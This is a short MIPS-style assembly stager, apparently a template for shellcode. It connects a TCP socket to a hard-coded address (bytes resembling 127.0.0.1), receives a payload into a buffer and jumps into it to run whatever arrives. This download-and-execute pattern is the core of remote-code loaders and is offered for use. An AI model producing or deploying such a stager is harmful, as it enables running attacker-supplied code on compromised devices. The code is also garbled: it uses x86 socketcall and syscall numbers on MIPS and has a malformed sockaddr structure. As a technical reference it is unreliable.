.data
sockaddr:
    .word 0x00000000    # sin_family
    .byte 0x1           # sin_port
    .byte 0x02          # sin_addr
    .byte 0x7f          # sin_addr
    .byte 0x00          # sin_addr
    .byte 0x01          # sin_addr
    .space 8            # padding

.text
.globl _start
_start:
    # create socket
    li $v0, 0x66         # syscall 102 (socketcall)
    li $a0, 0x1          # SYS_SOCKET
    li $a1, 0x1          # SOCK_STREAM
    li $a2, 0x0          # IPPROTO_IP
    syscall

    move $s0, $v0        # save socket file descriptor

    # connect to server
    li $v0, 0x66         # syscall 102 (socketcall)
    li $a0, 0x3          # SYS_CONNECT
    move $a1, $s0        # socket file descriptor
    la $a2, sockaddr     # pointer to sockaddr structure
    li $a3, 0x10         # length of sockaddr structure
    syscall

    # receive shellcode
    la $a0, shellcode    # pointer to buffer
    li $a1, 0x100        # buffer size
    li $a2, 0x0          # flags
    li $v0, 0x6d         # syscall 109 (recv)
    move $a3, $s0        # socket file descriptor
    syscall

    # execute shellcode
    jalr $a0

    # exit
    li $v0, 0x01         # syscall 1 (exit)
    li $a0, 0x00         # exit status
    syscall

shellcode:
    # your shellcode goes here
